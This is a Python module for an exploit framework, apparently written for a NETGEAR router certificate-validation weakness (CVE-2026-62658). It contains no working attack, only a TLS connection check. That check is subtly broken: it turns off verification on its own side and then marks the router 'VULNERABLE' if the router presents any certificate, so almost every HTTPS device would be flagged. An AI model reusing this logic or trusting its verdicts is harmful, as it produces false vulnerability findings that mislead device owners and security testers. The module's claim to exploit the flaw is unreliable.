# Author: Andre Henrique (LinkedIn/X: @mrhenrike)
import socket
import ssl
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """NETGEAR XR1000/RAXE500 Certificate Validation Weakness (CVE-2026-62658).

    Multiple NETGEAR routers perform insufficient TLS certificate
    validation when communicating with backend services (firmware
    update, telemetry, NTP). The firmware accepts self-signed or
    expired certificates, enabling a MITM attacker to intercept and
    modify management traffic, inject malicious firmware updates,
    or exfiltrate device configuration data.

    CVSS v3.1: 6.5 (Medium), AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "NETGEAR Router Certificate Validation Weakness (CVE-2026-62658)",
        "description": (
            "Exploits CVE-2026-62658 via weak TLS certificate validation "
            "on NETGEAR routers. The firmware accepts self-signed or "
            "expired certificates for backend services, enabling MITM "
            "interception of firmware updates, telemetry, and "
            "configuration data."
        ),
        "authors": (
            "Security researcher (discovery)",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2026-62658",
            "https://kb.netgear.com/000066540/Security-Advisory",
        ),
        "disclosure_date": "2026-06-12",
        "platform": "linux",
        "arch": "arm",
        "privileged": False,
        "targets": (
            "NETGEAR XR1000 (firmware < 1.0.0.74)",
            "NETGEAR RAXE500 (firmware < 1.0.14.134)",
            "NETGEAR MR70 (firmware < 1.1.0.74)",
            "NETGEAR MS70 (firmware < 1.1.0.74)",
        ),
    }

    target = OptIP("", "Target NETGEAR router IP")
    port = OptPort(443, "Target HTTPS port")
    timeout = OptFloat(5.0, "Connection timeout in seconds")

    def _check_cert_validation(self) -> dict:
        """Test if the target accepts connections with cert issues."""
        results = {
            "self_signed_accepted": False,
            "expired_accepted": False,
            "tls_version": "",
            "cipher": "",
        }

        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE

            with socket.create_connection(
                (str(self.target), self.port), timeout=self.timeout
            ) as raw:
                with ctx.wrap_socket(raw, server_hostname=str(self.target)) as ssock:
                    results["tls_version"] = ssock.version() or "unknown"
                    cipher_info = ssock.cipher()
                    if cipher_info:
                        results["cipher"] = cipher_info[0]
                    cert = ssock.getpeercert(binary_form=True)
                    if cert:
                        results["self_signed_accepted"] = True
        except (OSError, ssl.SSLError):
            pass

        return results

    @mute
    def check(self) -> bool:
        """Check if the HTTPS service is reachable."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((str(self.target), self.port))
            sock.close()
            return True
        except OSError:
            return False

    def run(self) -> None:
        if not self.check():
            print_error(f"Cannot connect to {self.target}:{self.port}")
            return

        print_success("HTTPS service reachable; analyzing certificate validation")
        self._exploit()

    def _exploit(self) -> None:
        results = self._check_cert_validation()

        print_status("Certificate validation analysis:")
        print_info(f"  TLS version: {results['tls_version']}")
        print_info(f"  Cipher: {results['cipher']}")

        if results["self_signed_accepted"]:
            print_success(
                "VULNERABLE: Router accepts connections without proper "
                "certificate validation. A MITM attacker can intercept "
                "firmware updates, telemetry, and configuration traffic."
            )
        else:
            print_info(
                "Certificate validation appears to be enforced on this "
                "firmware version."
            )
